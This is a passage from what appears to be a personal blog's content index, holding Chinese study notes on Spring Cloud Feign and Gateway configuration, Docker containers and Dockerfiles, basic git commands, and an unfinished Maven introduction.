user=restTemplate.getForObject(url,User.class);</code></pre><ul><li>代码可读性差，编程体验不统一</li><li>参数复杂URL难以维护</li></ul></li><li><p>Feign 是一个声明式htpp客户端，其作用可以让我们更优雅的实现http发送请求</p></li><li><p>定义和使用Feign客户端：</p><ul><li><ol><li>引入依赖</li></ol></li></ul><pre><code class="language-xml">  &lt;dependency&gt;    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;    &lt;artifactId&gt;spring-cloud-starter-openfeign&lt;/artifactId&gt;  &lt;/dependency&gt;</code></pre><ul><li><ol start="2"><li>在order-service的启动类中添加注解开启Feign开关<code>@EnableFeignClients</code></li></ol></li><li><ol start="3"><li>编写Feign客户端，主要基于SpringMVC的注解来声明说成调用信息</li></ol></li></ul><pre><code class="language-java">@FeignClient(&quot;userservice&quot;)public interface UserClient &#123;  @GetMapping(&quot;/user/&#123;id&#125;&quot;)  User findById(@PathVariable(&quot;id&quot;) Long id);&#125;</code></pre><ul><li><ol start="4"><li>使用FeignClien中定义的方法代替RestTemplate</li></ol></li></ul><pre><code class="language-java">public Order queryOrderById(Long orderId) &#123;      // 1.查询订单      Order order = orderMapper.findById(orderId);      // 2. 利用Feign远程调用      User user=userClient.findById(order.getUserId());      // 3。 封装user到Order      order.setUser(user);      // 4.返回      return order;  &#125;</code></pre></li></ul><h3 id="02-%E8%87%AA%E5%AE%9A%E4%B9%89%E9%85%8D%E7%BD%AE" tabindex="-1">02 自定义配置</h3><p><img src="/images/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF%E6%A0%88/Feign%E7%9A%84%E8%87%AA%E5%AE%9A%E4%B9%89%E9%85%8D%E7%BD%AE.jpg" alt></p><ul><li>配置feign的日志<ul><li><ol><li>配置文件方式</li></ol></li></ul><pre><code class="language-yaml">feign:  client:    config:      default/userservice: #默认为全局配置，或使用服务名仅针对某个服务         loggerLevel: FULl # 日志级别</code></pre><ul><li><ol start="2"><li>使用java代码</li></ol></li></ul><pre><code class="language-java">public class DefaultFeignConfiguration &#123;  @Bean  public Logger.Level logLevel()&#123;return Logger.Level.BASIC;&#125;&#125;</code></pre></li></ul><h3 id="03-feign%E4%BD%BF%E7%94%A8%E4%BC%98%E5%8C%96" tabindex="-1">03 Feign使用优化</h3><ul><li>优化手段<ul><li><ol><li>使用连接池代替默认的URLConnection</li></ol><ul><li>引入HTTPClient依赖</li></ul></li></ul><pre><code class="language-xml">&lt;dependency&gt;    &lt;groupId&gt;io.github.openfeign&lt;/groupId&gt;    &lt;artifactId&gt;feign-httpclient&lt;/artifactId&gt;&lt;/dependency&gt;</code></pre><pre><code class="language-yml">feign:  httpclient:    enable: true # 支持HttpClient开关    max-connections: 200 #最大连接数    max-connections-per-route: 50 #单个路径最大连接数</code></pre><ul><li><ol start="2"><li>日志级别，最好用basic或none</li></ol></li></ul></li></ul><h3 id="04-%E6%9C%80%E4%BD%B3%E5%AE%9E%E8%B7%B5" tabindex="-1">04 最佳实践</h3><ul><li><ol><li>继承：给消费者的FeignClient和提供者的controller定义统一的父接口作为标准</li></ol><ul><li>服务紧耦合（API已经相同了）</li><li>父接口参数列表中的映射不会被继承</li></ul></li><li><ol start="2"><li>抽取：将FeignClient抽取为独立模块，并且把接口有关的POJO，默认的Feign配置都放到这个模块中，提供给所有消费者使用</li></ol></li><li><p>抽取实践</p><ul><li>步骤：<ul><li><ol><li>首先创建一个module，命名为feign-api，然后引入feign的starter依赖</li></ol></li><li><ol start="2"><li>将order-service中编写的UserClient，User，DefaultFeignConfiguration都复制到feign-api项目中</li></ol></li><li><ol start="3"><li>在order-service中引入feign-api依赖</li></ol></li><li><ol start="4"><li>修改order-service中的所有与上述三个组件相关部分的import部分，改成导入feign-api的包</li></ol></li><li><ol start="5"><li>重启测试</li></ol></li></ul></li><li>当定义的FeignClient不在SpringBootApplication的扫描包范围时，这些FeignClien无法使用，有两种解决办法<ul><li><ol><li>指定FeignClient所在包<code>@EnableFeignClients(basePackages=&quot;cn.itcast.feign.clients&quot;)</code></li></ol></li><li><ol start="2"><li>指定FeignCLient字节码<code>@EnableFeignClients(clients=&#123;UserClient&#125;)</code></li></ol></li></ul></li></ul></li></ul><h2 id="%E7%BB%9F%E4%B8%80%E7%BD%91%E5%85%B3gateway" tabindex="-1">统一网关Gateway</h2><h3 id="01-%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E7%BD%91%E5%85%B3" tabindex="-1">01 为什么需要网关</h3><ul><li><p>网关功能</p><ul><li>身份认证和权限校验</li><li>服务路由，负载均衡</li><li>请求限流</li></ul></li><li><p>在springcloud中网关的实现有两种</p><ul><li>gateway和zuul</li><li>zuul是基于Servlet的实现，属于阻塞式编程。</li><li>而SpringCloudGateway则是属于Spring5中提供的WebFlux，属于响应式编程的实现，具有更好的性能。</li></ul></li></ul><h3 id="02-gateway%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8" tabindex="-1">02 gateway快速入门</h3><ul><li>搭建网关服务的步骤<ul><li><ol><li>创建新的moudle，引入SpringCloudGateway的依赖和eureka的服务发现依赖</li></ol></li></ul><pre><code class="language-xml">&lt;!--gateway--&gt;&lt;dependency&gt;    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;    &lt;artifactId&gt;spring-cloud-starter-gateway&lt;/artifactId&gt;&lt;/dependency&gt;&lt;!--eureka--&gt;&lt;dependency&gt;    &lt;groupId&gt;org.springframework.cloud&lt;/groupId&gt;    &lt;artifactId&gt;spring-cloud-starter-netflix-eureka-client&lt;/artifactId&gt;&lt;/dependency&gt;</code></pre><ul><li><ol start="2"><li>编写路由配置及eureka地址</li></ol><ul><li>路由配置包括：<ul><li><ol><li>路由id：路由的唯一标识</li></ol></li><li><ol start="2"><li>路由目标uri：路由的目标地址，http代表目标地址，lb代表根据服务名负载均衡</li></ol></li><li><ol start="3"><li>路由断言predicates：判断路由的规则</li></ol></li><li><ol start="4"><li>路由过滤器filters：对请求或响应做处理</li></ol></li></ul></li></ul></li></ul><pre><code class="language-yml">server:port: 10010spring:  application:    name: gateway  cloud:    gateway:      routes:        - id: user-service # 路由标识          uri: lb://userservice #路由的目标地址          predicates: #路由断言，判断请求是否符合规则            - Path=/user/** # 路径断言，判断路径是否以/user开头，如果是则符合        - id: order-service          uri: lb://orderservice          predicates:            - Path=/order/**</code></pre></li></ul><p><img src="/images/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF%E6%A0%88/%E7%BD%91%E5%85%B3%E6%9C%8D%E5%8A%A1%E5%9B%BE%E8%A7%A3.jpg" alt="网关服务图解"></p><h3 id="03-%E6%96%AD%E8%A8%80%E5%B7%A5%E5%8E%82" tabindex="-1">03 断言工厂</h3><ul><li>在配置文件中写的断言规则只是字符串，这些字符串会被Pred Factory读取并处理，转变为路由判断的条件</li></ul><p><img src="/images/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF%E6%A0%88/%E6%96%AD%E8%A8%80%E5%B7%A5%E5%8E%82.jpg" alt></p><p>具体使用可以参考<a href="https://docs.spring.io/spring-cloud-gateway/docs/current/reference/html/">官网</a></p><h3 id="04-%E8%BF%87%E6%BB%A4%E5%99%A8%E5%B7%A5%E5%8E%82" tabindex="-1">04 过滤器工厂</h3><ul><li>路由过滤器GatewayFilter<ul><li>GatewaFilter是网关中提供的一种过滤器，可以对进入网关的请求和微服务返回的响应做处理</li><li>Spring提供了31种不同的路由过滤器工厂，同样详见<a href="https://docs.spring.io/spring-cloud-gateway/docs/current/reference/html/">官网</a></li></ul><pre><code class="language-yml">spring:  application:    name: gateway  cloud:    gateway:      routes:        - id: user-service # 路由标识          uri: lb://userservice #路由的目标地址          predicates: #路由断言，判断请求是否符合规则           - Path=/user/** # 路径断言，判断路径是否以/user开头，如果是则符合        - id: order-service          uri: lb://orderservice          predicates:           - Path=/order/**          filters:            - AddRequestHeader = &quot;&quot; # 添加请求头      #default-filters: 这个是全路由过滤器，对所有的路由都生效，与routes平级        #- AddRequestHeader = &quot;&quot; # 添加请求头</code></pre></li></ul><h3 id="05-%E5%85%A8%E5%B1%80%E8%BF%87%E6%BB%A4%E5%99%A8" tabindex="-1">05 全局过滤器</h3><ul><li>全局过滤器GlobalFilter的作用也是处理一切进入网关的请求和微服务响应，与GatewayFilter作用一样。</li><li>区别是GatewaFilter通过配置定义，处理逻辑是固定的。而GlobalFilter的逻辑需要自己写代码实现，定义方法是实现GlobalFilter接口</li><li>实现全局过滤器的步骤<ul><li><ol><li>实现GlobalFilter接口</li></ol></li><li><ol start="2"><li>添加@Order注解或实现Ordered接口</li></ol></li><li><ol start="3"><li>编写处理逻辑</li></ol></li></ul></li></ul><pre><code class="language-java">@Order(-1)//设置优先级@Component//beanpublic class AuthorizeFilter implements GlobalFilter &#123;    @Override    public Mono&lt;Void&gt; filter(ServerWebExchange exchange, GatewayFilterChain chain) &#123;        // 1. 获取请求参数        MultiValueMap&lt;String,String&gt; params = exchange.getRequest().getQueryParams();;        // 2. 获取参数中的authorization参数        String auth = params.getFirst(&quot;authorization&quot;);        // 3. 判断参数值是否为admin        if(&quot;admin&quot;.equals(auth))&#123;            // 4. 是，放行            return chain.filter(exchange);        &#125;        // 5. 否，拦截        exchange.getResponse().setStatusCode(HttpStatus.UNAUTHORIZED);        return exchange.getResponse().setComplete();    &#125;&#125;</code></pre><ul><li>过滤器执行顺序<ul><li>请求进入网关后会碰到三类过滤器：当前路由的过滤器，DefaultFilter，GlobalFilter。请求路由后，会将当前路由过滤器和DefaultFilter，GlobalFilter合并到一个过滤器链（集合）中，排序后依次执行每个过滤器</li><li>每一个过滤器都必须指定一个int类型的order值，order值越小，优先级越高，执行顺序越靠前。</li><li>GlobalFilter通过实现Ordered接口或者添加@Order注解来指定order值，有编码者自己指定</li><li>路由过滤器和defaultFilter的order由Spring指定，默认是按照声明顺序从1递增</li><li>当过滤器的order值一样时，会按照 defaultFilter&gt;路由过滤器&gt;GlobalFilter的顺序执行</li></ul></li></ul><h3 id="06-%E8%B7%A8%E5%9F%9F%E9%97%AE%E9%A2%98%E5%A4%84%E7%90%86" tabindex="-1">06 跨域问题处理</h3><ul><li>跨域：域名不一致就是跨域，主要包括<ul><li>域名不同</li><li>域名相同，端口不同：</li></ul></li><li>跨域问题：浏览器禁止请求的发起者与服务端发生跨域ajax请求，请求被浏览器拦截的问题</li><li>解决方案：CORS</li><li>gateway已经实现CORS，使用者需要配置</li></ul><pre><code class="language-yml">spring:  cloud:    gateway:      globalcors: # 全局的跨域处理        add-to-simple-url-handler-mapping: true # 解决options请求被拦截问题        corsConfigurations:          '[/**]':            allowedOrigins: # 允许哪些网站的跨域请求              - &quot;http://localhost:8090&quot;              - &quot;http://www.leyou.com&quot;            allowedMethods: # 允许的跨域ajax的请求方式              - &quot;GET&quot;              - &quot;POST&quot;              - &quot;DELETE&quot;              - &quot;PUT&quot;              - &quot;OPTIONS&quot;            allowedHeaders: &quot;*&quot; # 允许在请求中携带的头信息            allowCredentials: true # 是否允许携带cookie            maxAge: 360000 # 这次跨域检测的有效期</code></pre><h2 id="docker" tabindex="-1">Docker</h2><h3 id="01-%E5%88%9D%E5%A7%8Bdocker" tabindex="-1">01 初始Docker</h3><ul><li><p>什么是Docker？</p><ul><li>项目部署问题：大型项目组件较多，运行环境也较为复杂，部署时会碰到一些问题<ul><li>依赖关系复杂，容易产生兼容性问题</li><li>开发，测试，生产环境有差异</li></ul></li><li>Docker如何解决依赖的兼容问题<ul><li>将应用的Libs(函数库)，Deps(依赖)，配置和应用一起打包</li><li>将每个应用放到一个隔离容器去运行，避免相互干扰</li></ul></li><li>Docker如何解决不同系统环境的问题<ul><li>Docker将用户程序与所需要调用的系统(比如Ubuntu)函数库一起打包</li><li>Docker运行到不同操作系统时，直接基于打包的库函数，借助于操作系统的Linux内核来运行</li><li>即Docker镜像中包含完整的运行环境，包含系统函数库，仅依赖系统的Linux内核，因此可以在任意Linux操作系统上运行</li></ul></li></ul></li><li><p>Docker和虚拟机的差异</p><ul><li>docker是一个系统进程；虚拟机是在操作系统中的操作系统</li><li>docker体积小，启动速度快，性能好；虚拟机体积大，启动速度慢，性能一般</li></ul></li><li><p>Docker架构</p><ul><li>镜像和容器<ul><li>镜像(Image):Docker将应用程序及其所需依赖，函数库，环境，配置等文件打包在一起，称为镜像</li><li>容器(Container):镜像中的应用程序运行后形成的进程就是容器，只是docker会给容器做隔离，对外不可见</li></ul></li><li>Docker和DockerHub<ul><li>DockerHub：是一个Docker镜像的托管平台，这样的平台称为Docker Registry</li><li>国内有类似DockerHub的公开服务，如网易云镜像服务，阿里云镜像服务</li></ul></li><li>Docker是一个CS架构，由两部分组成<ul><li>服务端(server):Docker守护进程，负责处理Docker指令，管理镜像，容器等</li><li>客户端(client):通过命令或RestAPI向Docker服务端发送指令。可以在本地或远程向服务端发送指令</li></ul></li></ul></li><li><p>安装Docker<br><a href="https://www.bilibili.com/video/BV1LQ4y127n4/?p=46&amp;spm_id_from=pageDriver&amp;vd_source=240b8edf72530a8ec2d9f48cc6514072">跟着视频按即可</a></p></li></ul><h3 id="02-docker%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C" tabindex="-1">02 Docker基本操作</h3><h4 id="%E9%95%9C%E5%83%8F%E6%93%8D%E4%BD%9C" tabindex="-1">镜像操作</h4><p><img src="../../images/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF%E6%A0%88/Docker%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C.jpg" alt="Docker基本操作"><br>主要是查看文档</p><h4 id="%E5%AE%B9%E5%99%A8%E6%93%8D%E4%BD%9C" tabindex="-1">容器操作</h4><p><img src="/images/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF%E6%A0%88/Docker%E7%9B%B8%E5%85%B3%E5%91%BD%E4%BB%A4.jpg" alt="Docker相关命令"></p><ul><li><p>创建一个Nginx容器</p><ul><li>去docker hub查看Nginx的容器的命令<br><code>docker run --name containerName -p 80:80 -d nginx</code><ul><li>命令解读：<ul><li>docker run:创建并运行一个容器</li><li>–name：给容器起一个名字，比如叫做mn</li><li>-p：将宿主机端口与容器端口映射，冒号左边是宿主机端口，右侧是容器端口</li><li>-d：后台运行容器</li><li>nginx：镜像名称</li></ul></li></ul></li></ul></li><li><p>查看容器日志的命令：</p><ul><li><code>docker logs</code></li><li>添加-f参数可以持续查看日志</li></ul></li><li><p>查看容器状态：<code>docker ps</code></p></li><li><p>删除容器<code>docker rm</code></p></li><li><p>案例操作示例：</p><ul><li>进入Nginx容器，修改HTML文件内容，添加“HELLO WORLD”：进入容器使用命令<code>docker exec -it containerName bash</code><ul><li>命令解读<ul><li>docker exec:进入容器内部</li><li>-it：给当前进入的容器创建一个标准输入，输出终端，允许我们与容器交互</li><li>containerName：要进去的容器的名称</li><li>bash：进入容器后执行的命令</li></ul></li></ul></li><li>创建并运行一个redis容器，并且支持数据持久化<ul><li><ol><li>到DockerHub搜索redis镜像</li></ol></li><li><ol start="2"><li>查看Redis镜像文档中的帮助信息</li></ol></li><li><ol start="3"><li>利用docker run命令运行一个Redis容器</li></ol></li></ul></li></ul></li></ul><h4 id="%E6%95%B0%E6%8D%AE%E5%8D%B7%EF%BC%88%E5%AE%B9%E5%99%A8%E6%95%B0%E6%8D%AE%E7%AE%A1%E7%90%86%EF%BC%89" tabindex="-1">数据卷（容器数据管理）</h4><ul><li><p>容器和数据耦合问题</p><ul><li><ol><li>不便于修改：当我们要修改Nginx的html内容时，需要进入容器内部修改，很不方便</li></ol></li><li><ol start="2"><li>数据不可复用：在容器内的修改对外是不可见的。所有修改对新创建的容器是不可复用的</li></ol></li><li><ol start="3"><li>升级维护困难，数据在容器内，如果要升级必然删除旧容器，所有数据会丢失</li></ol></li></ul></li><li><p>数据卷</p><ul><li>感觉和C++的指针很像，Container调用指向宿主文件系统的某个目录的指针<br><img src="/images/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF%E6%A0%88/Docker%E6%95%B0%E6%8D%AE%E5%8D%B7.jpg" alt="Docker数据卷"></li></ul></li><li><p>操作数据卷</p><ul><li>数据卷操作基本语法：<code>docker volume [COMMAND]</code><ul><li>create 创建一个volume</li><li>inspect 显示一个或多个volume的信息</li><li>ls  列出所有volume</li><li>prune 删除未使用的volume</li><li>rm 删除一个或多个指定的volume</li></ul></li><li>操作案例：创建一个数据卷，并查看数据卷在宿主机的目录位置</li></ul></li><li><p>挂载数据卷</p><ul><li>创建容器时，可以通过-v参数来挂载一个数据卷到某个容器目录</li><li>举例<code>docker run --name mn -v html:/root/html -p 8080:80 nginx</code><ul><li>docker run 创建并运行容器</li><li>–name mn：给容器起名叫mn</li><li>-v html:/root/html: 将html数据卷挂载到容器内/root/html这个目录中</li><li>-p 8080:80: 将宿主机的8080端口映射到容器内的80端口</li><li>ngnix：镜像名称</li></ul></li><li>案例：创建一个ngnix容器，修改html目录内index.html的内容（通过数据卷挂载）</li></ul></li><li><p>如果容器运行时volume不存在，会自动被创建出来</p></li></ul><h4 id="%E6%A1%88%E4%BE%8B%EF%BC%9A%E5%88%9B%E5%BB%BA%E5%B9%B6%E8%BF%90%E8%A1%8C%E4%B8%80%E4%B8%AAmysql%E5%AE%B9%E5%99%A8%EF%BC%8C%E5%B0%86%E5%AE%BF%E4%B8%BB%E6%9C%BA%E7%9B%AE%E5%BD%95%E7%9B%B4%E6%8E%A5%E6%8C%82%E8%BD%BD%E5%88%B0%E5%AE%B9%E5%99%A8%E4%B8%AD" tabindex="-1">案例：创建并运行一个MySQL容器，将宿主机目录直接挂载到容器中</h4><p>见视频，这里使用<code> docker pull mysql</code>直接拉取最新docker镜像</p><h4 id="%E6%80%BB%E7%BB%93" tabindex="-1">总结</h4><ul><li><ol><li>docker run的命令通过-v参数挂载文件或目录到容器中</li></ol><ul><li><ol><li>-v volume名称：容器内目录</li></ol></li><li><ol start="2"><li>-v 宿主机文件: 容器内文件</li></ol></li><li><ol start="3"><li>-v 宿主机目录：容器内目录</li></ol></li></ul></li><li><ol start="2"><li>数据卷挂载与目录直接挂载的</li></ol><ul><li><ol><li>数据卷挂载耦合度低，由docker来管理目录，但是目录较深，不好寻找</li></ol></li><li><ol start="2"><li>目录挂载耦合度较高，需要自己记录管理目录，但便于寻找</li></ol></li></ul></li></ul><h3 id="03-dockerfile%E8%87%AA%E5%AE%9A%E4%B9%89%E9%95%9C%E5%83%8F" tabindex="-1">03 Dockerfile自定义镜像</h3><h4 id="%E9%95%9C%E5%83%8F%E7%BB%93%E6%9E%84" tabindex="-1">镜像结构</h4><ul><li><p>镜像是将应用程序及其所需的系统函数库，环境，配置，依赖打包而成<br><img src="/images/web/%E5%BE%AE%E6%9C%8D%E5%8A%A1%E6%8A%80%E6%9C%AF%E6%A0%88/%E9%95%9C%E5%83%8F%E7%BB%93%E6%9E%84.jpg" alt="镜像结构"></p></li><li><p>镜像是分层结构：</p><ul><li>BaseImage层：包含基本的系统函数库，环境变量，文件系统</li><li>Entrypoint：入口，是镜像中应用启动的命令</li><li>其它：在BaseImage基础上添加依赖，安装程序，完成整个应用的安装和配置</li></ul></li></ul><h4 id="dockfile%E8%AF%AD%E6%B3%95" tabindex="-1">Dockfile语法</h4><p>Dockerfile就是一个文本文件，其中包含一个个指令（Instruction），用指令来说明要执行什么操作来构建镜像，每一个指令会形成一层Layer</p><table><thead><tr><th>指令</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td>FROM</td><td>指定基础镜像</td><td>FROM centos:7</td></tr><tr><td>ENV</td><td>设置环境变量</td><td>ENV key value</td></tr><tr><td>COPY</td><td>拷贝本地文件到镜像的指定目录</td><td>COPY ./mysql-5.7.rpm /tmp</td></tr><tr><td>RUN</td><td>执行Linux的shell命令，一般是安装过程的命令</td><td>RUN yum install gcc</td></tr><tr><td>EXPOSE</td><td>指定容器运行时监听的端口，是给镜像使用者看的</td><td>EXPOSE 8080</td></tr><tr><td>ENTRYPOINT</td><td>镜像中应用的启动命令，容器运行时调用</td><td>ENTRY java -jar xx.jar</td></tr></tbody></table><h4 id="%E6%9E%84%E5%BB%BAjava%E9%A1%B9%E7%9B%AE" tabindex="-1">构建Java项目</h4><p><a href="https://www.bilibili.com/video/BV1LQ4y127n4/?p=57&amp;spm_id_from=pageDriver&amp;vd_source=240b8edf72530a8ec2d9f48cc6514072">视频地址</a></p><ul><li><p>案例：基于centos创建一个新景象，运行一个java项目</p><ul><li><ol><li>新建一个空文件夹docker-demo</li></ol></li><li><ol start="2"><li>拷贝jar文件到该目录</li></ol></li><li><ol start="3"><li>拷贝jdk8.tar.gz到该目录</li></ol></li><li><ol start="4"><li>拷贝Dockerfile文件到该目录</li></ol></li><li><ol start="5"><li>进入docker-demo</li></ol></li><li><ol start="6"><li>运行命令<code>docker build -t javaweb:1.0</code></li></ol></li></ul></li><li><p>基于java：8-alpine镜像，将一个Java项目构建为镜像</p><ul><li>该镜像可以直接构建java镜像环境</li><li><ol><li>新建空目录，其中新建文件Dockerfile</li></ol></li><li><ol start="2"><li>将jar包拷贝到这个目录</li></ol></li><li><ol start="3"><li>编写Dockerfile文件</li></ol><ul><li><ol><li>基于java:8-alpine作为基础镜像</li></ol></li><li><ol start="2"><li>将app.jar拷贝到镜像</li></ol></li><li><ol start="3"><li>暴露端口</li></ol></li><li><ol start="4"><li>编写入口ENTRYPOINT</li></ol></li></ul></li><li><ol start="4"><li>使用docker build命令构建镜像</li></ol></li><li><ol start="5"><li>使用docker run创建容器并运行</li></ol></li></ul></li></ul><h4 id="%E6%80%BB%E7%BB%93-1" tabindex="-1">总结</h4><ul><li><ol><li>Dockerfile本质是一个文件，通过指令描述镜像的构建过程</li></ol></li><li><ol start="2"><li>Dockerfile的第一行必须是FROM，从一个基础镜像来构建</li></ol></li><li><ol start="3"><li>基础镜像可以是基本操作系统，如centos，也可以是其他人制作好的镜像，如java:8-alpine</li></ol></li></ul><h3 id="04-dockercompose" tabindex="-1">04 DockerCompose</h3><h4 id="%E8%AE%A4%E8%AF%86dockercompose" tabindex="-1">认识DockerCompose</h4><ul><li>什么是DockerCompose<ul><li>DockerCompose可以基于Compose文件帮我们快速的部署分布式应用，而无需手动一个个创建和运行容器</li><li>Compose文件是一个文本文件，可以通过定义集群中的每个容器如何运行</li></ul></li><li>DockerCompose的安装</li></ul><h4 id="%E9%83%A8%E7%BD%B2%E5%BE%AE%E6%9C%8D%E5%8A%A1%E9%9B%86%E7%BE%A4" tabindex="-1">部署微服务集群</h4><h3 id="05-docker%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93" tabindex="-1">05 Docker镜像仓库</h3><h4 id="%E6%90%AD%E5%BB%BA%E7%A7%81%E6%9C%89%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93" tabindex="-1">搭建私有镜像仓库</h4><ul><li>镜像仓库有公有的和私有的两种形式<ul><li>公共仓库：例如Docker官方Docker Hub，网易云镜像服务，阿里云镜像服务等</li><li>除使用公开仓库外，用户可以在本地搭建Docker Registry。企业自己的镜像最好是采用私有Docker Registry来实现</li></ul></li><li>创建过程，看视频</li></ul><h4 id="%E5%90%91%E9%95%9C%E5%83%8F%E4%BB%93%E5%BA%93%E6%8E%A8%E9%80%81%E9%95%9C%E5%83%8F" tabindex="-1">向镜像仓库推送镜像</h4><p>推送镜像到私有镜像服务必须先tag，步骤如下：</p><ol><li>重新tag本地镜像，名称前缀为私有仓库的地址：ip:8080/<code>docker tag ngnix:latest ip:8080/nginx:1.0</code></li><li>推送镜像<code>docker push ip:8080/nginx:1.0</code></li><li>拉取镜像<code>docker pull ip:8080/nginx:1.0</code></li></ol><h4 id="%E6%80%BB%E7%BB%93-2" tabindex="-1">总结</h4><ol><li>推送本地镜像仓库前都必须重命名(docker tag)镜像，以镜像仓库地址为前缀</li><li>镜像仓库推送前需要把仓库地址配置到docker服务的daemon.json文件中，被docker信任</li><li>推送使用docker push命令</li><li>拉取使用docker pull命令</li></ol><h2 id="mq" tabindex="-1">MQ</h2><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 后端 </tag>
            
            <tag> web </tag>
            
            <tag> IDEA </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git学习</title>
      <link href="/2023/03/22/%E5%B7%A5%E5%85%B7/git%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/03/22/%E5%B7%A5%E5%85%B7/git%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<p><a href="https://learngitbranching.js.org/?locale=zh_CN">连接</a></p><h2 id="%E5%9F%BA%E7%A1%80%E7%AF%87" tabindex="-1">基础篇</h2><ul><li><p><code>undo</code> 撤销一次更改</p></li><li><p><code>git commit</code><br>进行一次更改</p></li><li><p><code>git branch name</code><br>创建一个名为 name 的分支</p></li></ul><p>分支：可以理解为树分叉，每次选一个分叉进行开发</p><ul><li><p><code>git checkout name</code><br>切换到name的分支上</p></li><li><p><code>git checkout -b name</code><br>创建一个分支并转移到分支上</p></li><li><p><code>git merge name</code><br>将当前所在分支合并到name</p></li><li><p><code>git rebase name</code><br>将当前分支与name分支的另一种合并方法</p></li></ul><h2 id="%E9%AB%98%E7%BA%A7%E7%AF%87" tabindex="-1">高级篇</h2><p>head相当于当前指向位置</p><ul><li><p><code>git checkout hashval（绝对引用）</code><br>将head移动到对应hashval的节点上</p></li><li><p><code>git checkout name^</code> (相对应用)<br>表示将head指向name提交位置的父节点</p></li><li><p><code>git checkout name~x</code>（相对引用）<br>表示将head指向name提交位置后退x次的节点</p></li><li><p>使用相对引用最多的地方：移动分支<br><code>git branch -f main HEAD~3</code>表示将main分支强制指向HEAD的第三级父提交</p></li><li><p><code>git reset name ~x/^</code><br>改写历史，回到若干个节点前，已经改变的从未发生过，但仅对本地而言。<br>对于多人使用的远程分支是无效的。</p></li><li><p><code>git revert name ~x/^</code><br>前进一个节点，但新建的节点与回溯到的节点相同</p></li></ul><h2 id="%E8%BF%9B%E9%98%B6" tabindex="-1">进阶</h2><p>高级以上已经可应付90%，接下来是在复杂工作流中使用</p><ul><li><code>git cherry-pick &lt;提交号&gt;</code><br>将选择的提交号节点按顺序复制到当前head下</li><li><code>git rebase -i name ~x/^</code><br>将从HEAD当所选父节点的所有节点到可视化界面进行选择重排，复制到所选父节点下</li></ul><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/katex/dist/katex.min.css"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/markdown-it-texmath/css/texmath.min.css">]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>初入后端（未完）</title>
      <link href="/2023/03/22/web/%E5%88%9D%E5%85%A5%E5%90%8E%E7%AB%AF/"/>
      <url>/2023/03/22/web/%E5%88%9D%E5%85%A5%E5%90%8E%E7%AB%AF/</url>
      
        <content type="html"><![CDATA[<p>[toc]</p><h2 id="maven" tabindex="-1">Maven</h2><p><a href="https://www.bilibili.com/video/BV1m84y1w7Tb?p=50&amp;vd_source=240b8edf72530a8ec2d9f48cc6514072">视频地址</a></p><h3 id="01-maven%E6%A6%82%E8%BF%B0" tabindex="-1">01 Maven概述</h3><ul><li>Maven 时apache 旗下的一个开源软件，是一款用于管理和构建java项目的工具</li><li>他基于项目对象模型（POM）的概念，通过一小段描述信息来管理项目的构建</li><li>作用<ul><li>依赖管理：方便快件的管理项目依赖的资源(jar包)，避免版本冲突</li><li>统一项目结构：提供标准，同一的项目结构</li><li>项目构建：标准跨平台（Linux，Windows，MacOS）的自动化项目构建方式</li></ul></li><li><a href="http://maven.apache.org/">官网</a></li></ul><p><a href="/images/web/%E5%88%9D%E5%85%A5%E5%90%8E%E7%AB%AF/Maven%E4%BB%8B%E7%BB%8D.jpg">Maven介绍</a></p><h3 id="02-idea%E9%9B%86%E6%88%90maven" tabindex="-1">02 IDEA集成Maven</h3><ul><li><p>Maven安装：按视频走即可</p></li><li><p>根据视频进行maven的配置。</p></li><li><p>IDEA创建Maven项目</p><ul><li>创建模块，选择Maven，点击Next</li><li>填写模块名称，坐标信息，点击Finish，创建完成</li><li>编写程序运行</li></ul></li><li><p>Maven坐标</p><ul><li>什么是坐标？<ul><li>Maven中的坐标是资源的唯一标识，通过该坐标可以唯一定位资源位置</li><li>使用坐标来定义项目或引入项目中的依赖</li></ul></li><li>Maven坐标的主要组成<ul><li>groupId：定义当前Maven项目隶属组织名称（通常是域名反写）</li><li>artifactId：定义当前Maven项目名称（通常是模块名称）</li><li>version：定义当前项目版本号</li></ul></li></ul></li><li><p>IDEA导入Maven项目</p><ul><li>法一：打开IDEA，选择右侧Maven面板，点击+号，选中对应醒目的pom.xml文件，双击即可。</li><li>法二：打开IDEA中File中Project Structure -&gt; moudle -&gt; import mode 选中pom.xml文件即可</li></ul></li></ul><h3 id="03-%E4%BE%9D%E8%B5%96%E7%AE%A1%E7%90%86" tabindex="-1">03 依赖管理</h3><ul><li>依赖配置<ul><li>依赖：指当前项目运行所需要的jar包，一个项目中可以引入多个依赖</li><li>配置<ul><li><ol><li>在pos.xml中编写&lt;dependencies&gt;标签</li></ol></li><li><ol start="2"><li>在&lt;dependencies&gt;标签中使用&lt;dependency&gt;引入坐标</li></ol></li><li><ol start="3"><li>定义坐标的 